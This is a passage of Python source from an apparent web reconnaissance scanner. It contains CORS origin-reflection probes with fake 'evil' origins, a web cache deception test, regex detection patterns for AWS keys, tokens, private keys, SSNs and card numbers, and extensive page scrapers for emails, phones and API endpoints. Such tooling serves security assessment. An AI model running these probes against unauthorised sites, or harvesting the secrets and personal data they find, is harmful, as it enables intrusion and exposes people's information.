        p_note("Cloud buckets", "not measured - target is an IP")
        ctx["cloud_buckets"] = []
        return
    found = enumerate_cloud_buckets(host, timeout=args.timeout)
    ctx["cloud_buckets"] = found
    if found:
        for f in found:
            p_bad(f["service"], f["bucket"] + " -> " + f["url"] + " (HTTP " + str(f["status"]) + ")")
    else:
        p_ok("Cloud buckets", "none found")
# ================= CORS DEEP TESTING =================
CORS_TEST_ORIGINS = [
    "null",
    "https://evil-reconx-test.invalid",
    "https://reconx-test.evil.invalid",
    "http://localhost",
    "https://localhost",
]

def test_cors_deep(url, timeout=8):
    """Live: test CORS with multiple origins and check for reflection/misconfiguration."""
    results = []
    for origin in CORS_TEST_ORIGINS:
        r = http_request(url, timeout=timeout, headers={"Origin": origin},
                         allow_redirects=False)
        hdrs = r.get("headers") or {}
        acao = hdrs.get("access-control-allow-origin", "")
        acac = hdrs.get("access-control-allow-credentials", "")
        reflected = (acao == origin or acao == "*")
        creds = acac.lower() == "true"
        dangerous = reflected and creds
        results.append({"origin": origin, "acao": acao, "acac": acac,
                        "reflected": reflected, "credentials": creds,
                        "dangerous": dangerous, "status": r.get("status", 0)})
    return results

# ================= SENSITIVE DATA SCANNER =================
SENSITIVE_PATTERNS = [
    ("Email Address", re.compile(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}")),
    ("Phone Number", re.compile(r"\b(?:\+?1[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}\b")),
    ("SSN (US)", re.compile(r"\b\d{3}-\d{2}-\d{4}\b")),
    ("Credit Card", re.compile(r"\b(?:\d{4}[-\s]?){3}\d{4}\b")),
    ("IPv4 Address", re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")),
    ("AWS Key", re.compile(r"AKIA[0-9A-Z]{16}")),
    ("JWT Token", re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}")),
    ("Private Key", re.compile(r"-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----")),
    ("Google API Key", re.compile(r"AIza[0-9A-Za-z\-_]{35}")),
    ("Slack Token", re.compile(r"xox[baprs]-[0-9a-zA-Z]{10,48}")),
    ("GitHub Token", re.compile(r"gh[pousr]_[0-9A-Za-z]{36,}")),
]

def scan_sensitive_data(resp):
    if not resp or not resp.get("ok"):
        return []
    body = resp.get("body") or ""
    headers = resp.get("headers") or {}
    haystack = body + "\n" + "\n".join(f"{k}: {v}" for k, v in headers.items())
    found = []
    seen = set()
    for name, pat in SENSITIVE_PATTERNS:
        matches = pat.findall(haystack)
        if matches:
            # dedupe
            uniq = list(dict.fromkeys(matches))[:10]
            key = (name, len(uniq))
            if key in seen:
                continue
            seen.add(key)
            found.append({"type": name, "count": len(matches),
                          "samples": [str(m)[:60] for m in uniq[:5]]})
    return found

# ================= HTTP/2 DETECTION =================
def detect_http2(url, timeout=8):
    """Live: check if the server supports HTTP/2 (via ALPN or Upgrade)."""
    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    result = {"supported": False, "method": "", "details": ""}
    # Method 1: ALPN
    if parsed.scheme == "https":
        proto, err = tls_alpn(host, port, timeout=timeout)
        if proto == "h2":
            result["supported"] = True
            result["method"] = "ALPN"
            result["details"] = "h2 negotiated via ALPN"
            return result
        if proto:
            result["details"] = f"ALPN: {proto}"
    # Method 2: HTTP/2 Upgrade (h2c)
    try:
        r = http_request(url, timeout=timeout, headers={
            "Upgrade": "h2c", "Connection": "Upgrade, HTTP2-Settings",
            "HTTP2-Settings": "AAMAAABkAARAAAAAAAIAAAAA"
        }, allow_redirects=False)
        if r.get("status") == 101:
            result["supported"] = True
            result["method"] = "Upgrade (h2c)"
            result["details"] = "HTTP/2 upgrade accepted (101)"
            return result
        hdrs = r.get("headers") or {}
        if "http2" in str(hdrs).lower():
            result["supported"] = True
            result["method"] = "header"
            result["details"] = "HTTP/2 mentioned in headers"
    except Exception as e:
        result["details"] += f" | upgrade probe: {clean_error(e)}"
    if not result["supported"]:
        result["details"] = result["details"] or "HTTP/2 not detected"
    return result

# ================= WEB CACHE DECEPTION =================
def test_cache_deception(url, timeout=8):
    """Live: test if the cache stores personalized/dynamic content (cache deception)."""
    parsed = urlparse(url)
    root = f"{parsed.scheme}://{parsed.netloc}"
    test_paths = ["/profile", "/account", "/dashboard", "/settings", "/me",
                  "/api/user", "/user/profile"]
    results = []
    for path in test_paths:
        # request with a cache-busting suffix that looks like a static file
        test_url = f"{root}{path}/nonexistent.css"
        r = http_request(test_url, timeout=timeout, allow_redirects=False)
        status = r.get("status", 0)
        hdrs = r.get("headers") or {}
        cache_control = hdrs.get("cache-control", "")
        age = hdrs.get("age", "")
        x_cache = hdrs.get("x-cache", "")
        # if the dynamic page is cached (age > 0 or x-cache: hit), it's vulnerable
        cached = (age and age != "0") or "hit" in x_cache.lower()
        results.append({"path": path, "test_url": test_url, "status": status,
                        "cache_control": cache_control, "age": age,
                        "x_cache": x_cache, "cached": cached})
    return results

# ================= RUNNERS =================

def run_cors_deep(ctx, url, args):
    p_section("CORS Deep Testing", "39")
    ctx["modules_run"].append("cors_deep")
    resp = ctx.get("http_resp")
    if not resp or not ctx.get("http_ok"):
        p_note("CORS deep", "not measured - no HTTP response")
        ctx["cors_deep"] = []
        return
    res = test_cors_deep(url, timeout=args.timeout)
    ctx["cors_deep"] = res
    dangerous = [r for r in res if r["dangerous"]]
    if dangerous:
        for r in dangerous:
            p_bad(r["origin"], f"DANGEROUS: reflected + credentials (HTTP {r['status']})")
    else:
        reflected = [r for r in res if r["reflected"]]
        if reflected:
            for r in reflected:
                p_warn(r["origin"], f"reflected (acao={r['acao']}) but no credentials")
        else:
            p_ok("CORS deep", f"no origin reflection across {len(res)} tests")

def run_sensitive_data(ctx, url, args):
    p_section("Sensitive Data Scanner", "40")
    ctx["modules_run"].append("sensitive_data")
    resp = ctx.get("http_resp")
    if not resp or not ctx.get("http_ok"):
        p_note("Sensitive data", "not measured - no HTTP response")
        ctx["sensitive_data"] = []
        return
    found = scan_sensitive_data(resp)
    ctx["sensitive_data"] = found
    if found:
        for f in found:
            p_warn(f["type"], f"{f['count']} found (samples: {', '.join(f['samples'][:3])})")
    else:
        p_ok("Sensitive data", "no PII/secrets detected in response")

def run_http2(ctx, url, args):
    p_section("HTTP/2 Detection", "41")
    ctx["modules_run"].append("http2")
    res = detect_http2(url, timeout=args.timeout)
    ctx["http2"] = res
    if res["supported"]:
        p_ok("HTTP/2", f"supported ({res['method']}) - {res['details']}")
    else:
        p_note("HTTP/2", res["details"])

def run_cache_deception(ctx, url, args):
    p_section("Web Cache Deception", "42")
    ctx["modules_run"].append("cache_deception")
    resp = ctx.get("http_resp")
    if not resp or not ctx.get("http_ok"):
        p_note("Cache deception", "not measured - no HTTP response")
        ctx["cache_deception"] = []
        return
    res = test_cache_deception(url, timeout=args.timeout)
    ctx["cache_deception"] = res
    cached = [r for r in res if r["cached"]]
    if cached:
        for r in cached:
            p_bad(r["path"], f"CACHED dynamic content (age={r['age']}, x-cache={r['x_cache']})")
    else:
        p_ok("Cache deception", f"no cached dynamic content across {len(res)} paths")
# ================= COMPREHENSIVE RESOURCE EXTRACTOR =================
def extract_all_resources(resp, timeout=8):
    """Live: extract EVERY resource, link, media, script, style, meta, feed, API, etc. from the page."""
    if not resp or not resp.get("ok"):
        return {}
    body = resp.get("body") or ""
    parsed = urlparse(resp.get("url") or "")
    root = f"{parsed.scheme}://{parsed.netloc}"
    out = {
        "links_internal": [], "links_external": [], "links_all": [],
        "images": [], "videos": [], "audio": [], "iframes": [],
        "scripts": [], "stylesheets": [], "fonts": [],
        "meta_tags": [], "og_tags": {}, "twitter_cards": {},
        "json_ld": [], "rss_feeds": [], "atom_feeds": [],
        "prefetch": [], "preload": [], "preconnect": [], "dns_prefetch": [],
        "favicons": [], "manifests": [], "service_workers": [],
        "forms": [], "emails": [], "phones": [],
        "social_links": [], "api_endpoints": [],
        "third_party_domains": [], "subdomains": [],
        "anchors": [], "buttons": [],
        "websockets": [], "sse": [],
        "all_urls": [],
    }

    # ---- ALL LINKS ----
    link_re = re.compile(r'<a\b[^>]*href=["\']?([^"\'\s>]+)', re.I)
    for m in link_re.finditer(body):
        href = m.group(1).strip()
        if not href or href.startswith(("#", "javascript:", "mailto:", "tel:", "data:")):
            if href.startswith("mailto:"):
                out["emails"].append(href.replace("mailto:", "").split("?")[0])
            if href.startswith("tel:"):
                out["phones"].append(href.replace("tel:", "").split("?")[0])
            continue
        if href.startswith("/"):
            full = root + href
        elif href.startswith("http"):
            full = href
        else:
            full = root + "/" + href
        out["links_all"].append(full)
        if parsed.netloc in full or full.startswith(root):
            if full not in out["links_internal"]:
                out["links_internal"].append(full)
        else:
            if full not in out["links_external"]:
                out["links_external"].append(full)

    # ---- IMAGES ----
    img_re = re.compile(r'<img\b[^>]*src=["\']?([^"\'\s>]+)', re.I)
    for m in img_re.finditer(body):
        src = m.group(1).strip()
        if src.startswith("/"):
            src = root + src
        elif not src.startswith("http"):
            src = root + "/" + src
        if src not in out["images"]:
            out["images"].append(src)
    # srcset
    srcset_re = re.compile(r'srcset=["\']([^"\']+)', re.I)
    for m in srcset_re.finditer(body):
        for part in m.group(1).split(","):
            url = part.strip().split()[0]
            if url.startswith("/"):
                url = root + url
            elif not url.startswith("http"):
                url = root + "/" + url
            if url and url not in out["images"]:
                out["images"].append(url)

    # ---- VIDEOS ----
    video_re = re.compile(r'<video\b[^>]*src=["\']?([^"\'\s>]+)', re.I)
    for m in video_re.finditer(body):
        src = m.group(1).strip()
        if src.startswith("/"):
            src = root + src
        elif not src.startswith("http"):
            src = root + "/" + src
        if src not in out["videos"]:
            out["videos"].append(src)
    # <source> inside video
    source_re = re.compile(r'<source\b[^>]*src=["\']?([^"\'\s>]+)', re.I)
    for m in source_re.finditer(body):
        src = m.group(1).strip()
        if src.startswith("/"):
            src = root + src
        elif not src.startswith("http"):
            src = root + "/" + src
        if src not in out["videos"] and (".mp4" in src or ".webm" in src or ".ogg" in src or ".mov" in src):
            out["videos"].append(src)

    # ---- AUDIO ----
    audio_re = re.compile(r'<audio\b[^>]*src=["\']?([^"\'\s>]+)', re.I)
    for m in audio_re.finditer(body):
        src = m.group(1).strip()
        if src.startswith("/"):
            src = root + src
        elif not src.startswith("http"):
            src = root + "/" + src
        if src not in out["audio"]:
            out["audio"].append(src)

    # ---- IFRAMES ----
    iframe_re = re.compile(r'<iframe\b[^>]*src=["\']?([^"\'\s>]+)', re.I)
    for m in iframe_re.finditer(body):
        src = m.group(1).strip()
        if src.startswith("/"):
            src = root + src
        elif not src.startswith("http"):
            src = root + "/" + src
        if src not in out["iframes"]:
            out["iframes"].append(src)

    # ---- SCRIPTS ----
    script_re = re.compile(r'<script\b[^>]*src=["\']?([^"\'\s>]+)', re.I)
    for m in script_re.finditer(body):
        src = m.group(1).strip()
        if src.startswith("/"):
            src = root + src
        elif not src.startswith("http"):
            src = root + "/" + src
        if src not in out["scripts"]:
            out["scripts"].append(src)

    # ---- STYLESHEETS ----
    css_re = re.compile(r'<link\b[^>]*href=["\']?([^"\'\s>]+)[^>]*rel=["\']?stylesheet', re.I)
    for m in css_re.finditer(body):
        href = m.group(1).strip()
        if href.startswith("/"):
            href = root + href
        elif not href.startswith("http"):
            href = root + "/" + href
        if href not in out["stylesheets"]:
            out["stylesheets"].append(href)
    # also rel="stylesheet" before href
    css_re2 = re.compile(r'<link\b[^>]*rel=["\']?stylesheet[^>]*href=["\']?([^"\'\s>]+)', re.I)
    for m in css_re2.finditer(body):
        href = m.group(1).strip()
        if href.startswith("/"):
            href = root + href
        elif not href.startswith("http"):
            href = root + "/" + href
        if href not in out["stylesheets"]:
            out["stylesheets"].append(href)

    # ---- FONTS ----
    font_re = re.compile(r'url\(["\']?([^"\'\s)]+\.(?:woff2?|ttf|otf|eot))', re.I)
    for m in font_re.finditer(body):
        u = m.group(1).strip()
        if u.startswith("/"):
            u = root + u
        elif not u.startswith("http"):
            u = root + "/" + u
        if u not in out["fonts"]:
            out["fonts"].append(u)

    # ---- FAVICONS ----
    favicon_re = re.compile(r'<link\b[^>]*rel=["\']?(?:icon|shortcut icon|apple-touch-icon)[^>]*href=["\']?([^"\'\s>]+)', re.I)
    for m in favicon_re.finditer(body):
        href = m.group(1).strip()
        if href.startswith("/"):
            href = root + href
        elif not href.startswith("http"):
            href = root + "/" + href
        if href not in out["favicons"]:
            out["favicons"].append(href)

    # ---- MANIFESTS ----
    manifest_re = re.compile(r'<link\b[^>]*rel=["\']?manifest[^>]*href=["\']?([^"\'\s>]+)', re.I)
    for m in manifest_re.finditer(body):
        href = m.group(1).strip()
        if href.startswith("/"):
            href = root + href
        elif not href.startswith("http"):
            href = root + "/" + href
        if href not in out["manifests"]:
            out["manifests"].append(href)

    # ---- META TAGS ----
    meta_re = re.compile(r'<meta\b([^>]+)>', re.I)
    for m in meta_re.finditer(body):
        attrs = m.group(1)
        # name/content or property/content or http-equiv/content
        nm = re.search(r'name=["\']?([^"\'\s>]+)', attrs, re.I)
        prop = re.search(r'property=["\']?([^"\'\s>]+)', attrs, re.I)
        he = re.search(r'http-equiv=["\']?([^"\'\s>]+)', attrs, re.I)
        content = re.search(r'content=["\']?([^"\']+)', attrs, re.I)
        cval = content.group(1).strip() if content else ""
        if nm:
            out["meta_tags"].append({"name": nm.group(1), "content": cval})
        elif prop:
            out["meta_tags"].append({"property": prop.group(1), "content": cval})
        elif he:
            out["meta_tags"].append({"http_equiv": he.group(1), "content": cval})

    # ---- OPEN GRAPH ----
    for mt in out["meta_tags"]:
        if "property" in mt and mt["property"].startswith("og:"):
            out["og_tags"][mt["property"]] = mt.get("content", "")

    # ---- TWITTER CARDS ----
    for mt in out["meta_tags"]:
        if "name" in mt and mt["name"].startswith("twitter:"):
            out["twitter_cards"][mt["name"]] = mt.get("content", "")

    # ---- JSON-LD ----
    jsonld_re = re.compile(r'<script[^>]*type=["\']application/ld\+json["\'][^>]*>(.*?)</script>', re.I | re.S)
    for m in jsonld_re.finditer(body):
        try:
            data = json.loads(m.group(1).strip())
            out["json_ld"].append(data)
        except Exception:
            out["json_ld"].append({"raw": m.group(1).strip()[:500]})

    # ---- RSS FEEDS ----
    rss_re = re.compile(r'<link\b[^>]*type=["\']application/rss\+xml["\'][^>]*href=["\']?([^"\'\s>]+)', re.I)
    for m in rss_re.finditer(body):
        href = m.group(1).strip()
        if href.startswith("/"):
            href = root + href
        elif not href.startswith("http"):
            href = root + "/" + href
        if href not in out["rss_feeds"]:
            out["rss_feeds"].append(href)
    rss_re2 = re.compile(r'<link\b[^>]*href=["\']?([^"\'\s>]+)[^>]*type=["\']application/rss\+xml', re.I)
    for m in rss_re2.finditer(body):
        href = m.group(1).strip()
        if href.startswith("/"):
            href = root + href
        elif not href.startswith("http"):
            href = root + "/" + href
        if href not in out["rss_feeds"]:
            out["rss_feeds"].append(href)

    # ---- ATOM FEEDS ----
    atom_re = re.compile(r'<link\b[^>]*type=["\']application/atom\+xml["\'][^>]*href=["\']?([^"\'\s>]+)', re.I)
    for m in atom_re.finditer(body):
        href = m.group(1).strip()
        if href.startswith("/"):
            href = root + href
        elif not href.startswith("http"):
            href = root + "/" + href
        if href not in out["atom_feeds"]:
            out["atom_feeds"].append(href)

    # ---- PREFETCH / PRELOAD / PRECONNECT / DNS-PREFETCH ----
    for rel in ("prefetch", "preload", "preconnect", "dns-prefetch"):
        pat = re.compile(r'<link\b[^>]*rel=["\']?' + rel + r'[^>]*href=["\']?([^"\'\s>]+)', re.I)
        for m in pat.finditer(body):
            href = m.group(1).strip()
            if href.startswith("/"):
                href = root + href
            elif not href.startswith("http"):
                href = root + "/" + href
            if rel == "prefetch" and href not in out["prefetch"]:
                out["prefetch"].append(href)
            elif rel == "preload" and href not in out["preload"]:
                out["preload"].append(href)
            elif rel == "preconnect" and href not in out["preconnect"]:
                out["preconnect"].append(href)
            elif rel == "dns-prefetch" and href not in out["dns_prefetch"]:
                out["dns_prefetch"].append(href)

    # ---- SERVICE WORKERS ----
    sw_re = re.compile(r"navigator\.serviceWorker\.register\(['\"]([^'\"]+)['\"]", re.I)
    for m in sw_re.finditer(body):
        u = m.group(1)
        if u.startswith("/"):
            u = root + u
        elif not u.startswith("http"):
            u = root + "/" + u
        if u not in out["service_workers"]:
            out["service_workers"].append(u)

    # ---- WEBSOCKETS ----
    ws_re = re.compile(r"wss?://[^\s\"'<>]+", re.I)
    for m in ws_re.finditer(body):
        u = m.group(0)
        if u not in out["websockets"]:
            out["websockets"].append(u)

    # ---- SSE (Server-Sent Events) ----
    sse_re = re.compile(r"EventSource\(['\"]([^'\"]+)['\"]", re.I)
    for m in sse_re.finditer(body):
        u = m.group(1)
        if u.startswith("/"):
            u = root + u
        elif not u.startswith("http"):
            u = root + "/" + u
        if u not in out["sse"]:
            out["sse"].append(u)

    # ---- API ENDPOINTS (from links, scripts, forms, etc.) ----
    api_patterns = [
        re.compile(r'["\'](/api/[a-zA-Z0-9_\-/]+)["\']'),
        re.compile(r'["\'](/v[0-9]+/[a-zA-Z0-9_\-/]+)["\']'),
        re.compile(r'["\'](https?://[^"\']*api[^"\']*)["\']', re.I),
        re.compile(r'["\'](https?://[^"\']*rest[^"\']*)["\']', re.I),
        re.compile(r'["\'](https?://[^"\']*graphql[^"\']*)["\']', re.I),
    ]
    for pat in api_patterns:
        for m in pat.finditer(body):
            ep = m.group(1)
            if ep not in out["api_endpoints"]:
                out["api_endpoints"].append(ep)

    # ---- SOCIAL MEDIA LINKS ----
    social_domains = ["facebook.com", "twitter.com", "x.com", "instagram.com",
                      "linkedin.com", "youtube.com", "tiktok.com", "github.com",
                      "gitlab.com", "reddit.com", "pinterest.com", "snapchat.com",
                      "telegram.org", "whatsapp.com", "discord.com", "discord.gg"]
    for link in out["links_all"]:
        for sd in social_domains:
            if sd in link.lower() and link not in out["social_links"]:
                out["social_links"].append(link)

    # ---- THIRD-PARTY DOMAINS ----
    tp_set = set()
    for link in out["links_all"] + out["scripts"] + out["stylesheets"] + out["images"]:
        try:
            d = urlparse(link).netloc
            if d and d != parsed.netloc:
                tp_set.add(d)
        except Exception:
            pass
    out["third_party_domains"] = sorted(tp_set)

    # ---- SUBDOMAINS (referenced in page) ----
    sub_set = set()
    for link in out["links_all"]:
        try:
            d = urlparse(link).netloc
            if d and d != parsed.netloc and d.endswith(parsed.netloc.split(".")[-2] + "." + parsed.netloc.split(".")[-1] if "." in parsed.netloc else parsed.netloc):
                if d not in (parsed.netloc,):
                    sub_set.add(d)
        except Exception:
            pass
    out["subdomains"] = sorted(sub_set)

    # ---- ALL UNIQUE URLs ----
    all_u = set()
    for lst in [out["links_all"], out["images"], out["videos"], out["audio"],
                out["scripts"], out["stylesheets"], out["iframes"], out["fonts"],
                out["favicons"], out["manifests"], out["service_workers"],
                out["websockets"], out["sse"], out["api_endpoints"]]:
        for u in lst:
            all_u.add(u)
    out["all_urls"] = sorted(all_u)

    # ---- ANCHORS (named anchors) ----
    anchor_re = re.compile(r'<a\b[^>]*name=["\']?([^"\'\s>]+)', re.I)
    for m in anchor_re.finditer(body):
        out["anchors"].append(m.group(1))

    # ---- BUTTONS ----
    btn_re = re.compile(r'<button\b[^>]*>(.*?)</button>', re.I | re.S)
    for m in btn_re.finditer(body):
        text = re.sub(r'<[^>]+>', '', m.group(1)).strip()
        if text and text not in out["buttons"]:
            out["buttons"].append(text[:60])

    # dedupe emails/phones
    out["emails"] = sorted(set(out["emails"]))
    out["phones"] = sorted(set(out["phones"]))

    return out

def run_resource_extractor(ctx, url, args):
    p_section("Resource Extractor (all page resources)", "RE")
    ctx["modules_run"].append("resource_extractor")
    resp = ctx.get("http_resp")
    if not resp or not ctx.get("http_ok"):
        p_note("Resources", "not measured - no HTTP response")
        ctx["resources"] = {}
        return
    res = extract_all_resources(resp, timeout=args.timeout)
    ctx["resources"] = res

    # print summary
    p_ok("Total unique URLs", len(res.get("all_urls", [])))
    p_ok("Internal links", len(res.get("links_internal", [])))
    p_ok("External links", len(res.get("links_external", [])))
    p_ok("Images", len(res.get("images", [])))
    p_ok("Videos", len(res.get("videos", [])))
    p_ok("Audio", len(res.get("audio", [])))
    p_ok("Iframes", len(res.get("iframes", [])))
    p_ok("Scripts", len(res.get("scripts", [])))
    p_ok("Stylesheets", len(res.get("stylesheets", [])))
    p_ok("Fonts", len(res.get("fonts", [])))
    p_ok("Favicons", len(res.get("favicons", [])))
    p_ok("Manifests", len(res.get("manifests", [])))
    p_ok("Service workers", len(res.get("service_workers", [])))
    p_ok("RSS feeds", len(res.get("rss_feeds", [])))
    p_ok("Atom feeds", len(res.get("atom_feeds", [])))
    p_ok("Prefetch", len(res.get("prefetch", [])))
    p_ok("Preload", len(res.get("preload", [])))
    p_ok("Preconnect", len(res.get("preconnect", [])))
    p_ok("DNS prefetch", len(res.get("dns_prefetch", [])))
    p_ok("API endpoints", len(res.get("api_endpoints", [])))
    p_ok("WebSockets", len(res.get("websockets", [])))
    p_ok("SSE endpoints", len(res.get("sse", [])))
    p_ok("Social links", len(res.get("social_links", [])))
    p_ok("Third-party domains", len(res.get("third_party_domains", [])))
    p_ok("Subdomains (referenced)", len(res.get("subdomains", [])))
    p_ok("Emails", len(res.get("emails", [])))
    p_ok("Phones", len(res.get("phones", [])))
    p_ok("Buttons", len(res.get("buttons", [])))
    p_ok("Anchors", len(res.get("anchors", [])))
    p_ok("JSON-LD blocks", len(res.get("json_ld", [])))
    p_ok("Meta tags", len(res.get("meta_tags", [])))
    p_ok("Open Graph tags", len(res.get("og_tags", {})))
    p_ok("Twitter cards", len(res.get("twitter_cards", {})))

    # print details for key categories
    if res.get("api_endpoints"):
        p_line()
        p_ok("API Endpoints:", "")
        for ep in res["api_endpoints"][:20]:
            p_note("  api", ep, C.GR)
    if res.get("third_party_domains"):
        p_line()
        p_ok("Third-Party Domains:", "")
        for d in res["third_party_domains"][:20]:
            p_note("  domain", d, C.GR)
    if res.get("subdomains"):
        p_line()
        p_ok("Subdomains (referenced in page):", "")
        for s in res["subdomains"][:20]:
            p_note("  subdomain", s, C.GR)
    if res.get("scripts"):
        p_line()
        p_ok("Scripts:", "")
        for s in res["scripts"][:15]:
            p_note("  script", shorten(s, 90), C.GR)
    if res.get("links_external"):
        p_line()
        p_ok("External Links (first 15):", "")
        for l in res["links_external"][:15]:
            p_note("  link", shorten(l, 90), C.GR)
    if res.get("images"):
        p_line()
        p_ok("Images (first 10):", "")
        for img in res["images"][:10]:
            p_note("  img", shorten(img, 90), C.GR)
    if res.get("videos"):
        p_line()
        p_ok("Videos:", "")
        for v in res["videos"]:
            p_note("  video", v, C.GR)
    if res.get("emails"):
        p_line()
        p_ok("Emails:", "")
        for e in res["emails"]:
            p_note("  email", e, C.GR)
    if res.get("social_links"):
        p_line()
        p_ok("Social Links:", "")
        for s in res["social_links"]:
            p_note("  social", s, C.GR)
    if res.get("og_tags"):
        p_line()
        p_ok("Open Graph:", "")
        for k, v in list(res["og_tags"].items())[:10]:
            p_note(f"  {k}", shorten(v, 80), C.GR)
    if res.get("json_ld"):
        p_line()
        p_ok("JSON-LD blocks:", len(res["json_ld"]))
# ================= FULL LINK EXTRACTOR =================
def extract_all_links(resp, timeout=8):
    """Live: extract every link (href/src) from the page HTML."""
    if not resp or not resp.get("ok"):
        return {"internal": [], "external": [], "all": []}
    body = resp.get("body") or ""
    if not body:
        return {"internal": [], "external": [], "all": []}
    parsed = urlparse(resp.get("url") or "")
    base = f"{parsed.scheme}://{parsed.netloc}"
    all_links = set()
    # href and src attributes
    for m in re.finditer(r"""(?:href|src|action|data-src|data-href|poster)\s*=\s*["']([^"']+)""", body, re.I):
        link = m.group(1).strip()
        if link and not link.startswith(("javascript:", "mailto:", "tel:", "#", "data:")):
            all_links.add(link)
    # also find URLs in text
    for m in re.finditer(r'https?://[^\s"\'<>]+', body):
        all_links.add(m.group(0))
    internal = []
    external = []
    for link in all_links:
        if link.startswith("/"):
            internal.append(base + link)
        elif link.startswith("http"):
            if parsed.netloc in link:
                internal.append(link)
            else:
                external.append(link)
        else:
            internal.append(base + "/" + link)
    return {"internal": sorted(set(internal)), "external": sorted(set(external)),
            "all": sorted(set(internal + external)), "total": len(all_links)}

# ================= MEDIA / VIDEO EXTRACTOR =================
def extract_media(resp, timeout=8):
    """Live: extract video, audio, image, and document URLs from the page."""
    if not resp or not resp.get("ok"):
        return {"videos": [], "audio": [], "images": [], "documents": [], "iframes": []}
    body = resp.get("body") or ""
    if not body:
        return {"videos": [], "audio": [], "images": [], "documents": [], "iframes": []}
    parsed = urlparse(resp.get("url") or "")
    base = f"{parsed.scheme}://{parsed.netloc}"

    def resolve(u):
        u = u.strip()
        if u.startswith("/"):
            return base + u
        elif u.startswith("http"):
            return u
        elif u.startswith("//"):
            return parsed.scheme + ":" + u
        else:
            return base + "/" + u

    videos = set()
    audio = set()
    images = set()
    documents = set()
    iframes = set()

    # video tags
    for m in re.finditer(r'<video[^>]*src=["\']([^"\']+)["\']', body, re.I):
        videos.add(resolve(m.group(1)))
    for m in re.finditer(r'<source[^>]*src=["\']([^"\']+)["\']', body, re.I):
        src = m.group(1)
        if any(ext in src.lower() for ext in (".mp4", ".webm", ".ogg", ".mov", ".avi", ".mkv")):
            videos.add(resolve(src))
        elif any(ext in src.lower() for ext in (".mp3", ".wav", ".ogg", ".aac", ".flac")):
            audio.add(resolve(src))
    # iframe (YouTube, Vimeo, etc.)
    for m in re.finditer(r'<iframe[^>]*src=["\']([^"\']+)["\']', body, re.I):
        src = m.group(1)
        if any(d in src.lower() for d in ("youtube", "vimeo", "dailymotion", "twitch", "wistia")):
            iframes.add(resolve(src))
    # img tags
    for m in re.finditer(r'<img[^>]*src=["\']([^"\']+)["\']', body, re.I):
        images.add(resolve(m.group(1)))
    # background images in CSS
    for m in re.finditer(r'background(?:-image)?\s*:\s*url\(["\']?([^"\'\)]+)', body, re.I):
        images.add(resolve(m.group(1)))
    # document links
    for m in re.finditer(r'href=["\']([^"\']+)["\']', body, re.I):
        href = m.group(1)
        if any(ext in href.lower() for ext in (".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".zip", ".rar", ".tar", ".gz", ".txt", ".csv")):
            documents.add(resolve(href))

    return {"videos": sorted(videos), "audio": sorted(audio),
            "images": sorted(images)[:50], "documents": sorted(documents),
            "iframes": sorted(iframes)}

# ================= METADATA EXTRACTOR =================
def extract_metadata(resp):
    """Live: extract page metadata (OG, Twitter, meta tags, canonical, etc.)."""
    if not resp or not resp.get("ok"):
        return {}
    body = resp.get("body") or ""
    if not body:
        return {}
    meta = {}
    # title
    m = re.search(r"<title[^>]*>(.*?)</title>", body, re.I | re.S)
    if m:
        meta["title"] = m.group(1).strip()[:200]
    # meta tags
    for m in re.finditer(r'<meta[^>]+>', body, re.I):
        tag = m.group(0)
        name_m = re.search(r'name\s*=\s*["\']([^"\']+)["\']', tag, re.I)
        prop_m = re.search(r'property\s*=\s*["\']([^"\']+)["\']', tag, re.I)
        content_m = re.search(r'content\s*=\s*["\']([^"\']*)["\']', tag, re.I)
        if content_m:
            key = None
            if name_m:
                key = "meta:" + name_m.group(1).lower()
            elif prop_m:
                key = prop_m.group(1).lower()
            if key:
                meta[key] = content_m.group(1)[:300]
    # canonical
    m = re.search(r'<link[^>]+rel\s*=\s*["\']canonical["\'][^>]*href\s*=\s*["\']([^"\']+)["\']', body, re.I)
    if m:
        meta["canonical"] = m.group(1)
    # alternate (hreflang)
    alternates = []
    for m in re.finditer(r'<link[^>]+rel\s*=\s*["\']alternate["\'][^>]*hreflang\s*=\s*["\']([^"\']+)["\'][^>]*href\s*=\s*["\']([^"\']+)["\']', body, re.I):
        alternates.append({"lang": m.group(1), "url": m.group(2)})
    if alternates:
        meta["alternates"] = alternates
    # favicon
    m = re.search(r'<link[^>]+rel\s*=\s*["\'](?:shortcut )?icon["\'][^>]*href\s*=\s*["\']([^"\']+)["\']', body, re.I)
    if m:
        meta["favicon"] = m.group(1)
    # manifest
    m = re.search(r'<link[^>]+rel\s*=\s*["\']manifest["\'][^>]*href\s*=\s*["\']([^"\']+)["\']', body, re.I)
    if m:
        meta["manifest"] = m.group(1)
    # robots
    m = re.search(r'<meta[^>]+name\s*=\s*["\']robots["\'][^>]*content\s*=\s*["\']([^"\']+)["\']', body, re.I)
    if m:
        meta["robots"] = m.group(1)
    return meta

# ================= CONTACT INFO EXTRACTOR =================
def extract_contact_info(resp):
    """Live: extract phone numbers, social media links, addresses from the page."""
    if not resp or not resp.get("ok"):
        return {"phones": [], "social": {}, "addresses": []}
    body = resp.get("body") or ""
    if not body:
        return {"phones": [], "social": {}, "addresses": []}
    # phone numbers
    phones = set()
    for m in re.finditer(r'(?:tel:|phone|telephone|call|contact)[^0-9]*?(\+?[\d\s\-\(\)]{7,20})', body, re.I):
        p = m.group(1).strip()
        if len(re.sub(r'\D', '', p)) >= 7:
            phones.add(p)
    # also tel: links
    for m in re.finditer(r'href=["\']tel:([^"\']+)["\']', body, re.I):
        phones.add(m.group(1).strip())
    # social media
    social = {}
    social_patterns = {
        "facebook": r'facebook\.com/[a-zA-Z0-9._-]+',
        "twitter": r'twitter\.com/[a-zA-Z0-9_]+',
        "x (twitter)": r'x\.com/[a-zA-Z0-9_]+',
        "instagram": r'instagram\.com/[a-zA-Z0-9._]+',
        "linkedin": r'linkedin\.com/(?:company|in)/[a-zA-Z0-9._-]+',
        "youtube": r'youtube\.com/(?:channel|c|user|@)[a-zA-Z0-9._-]+',
        "tiktok": r'tiktok\.com/@[a-zA-Z0-9._]+',
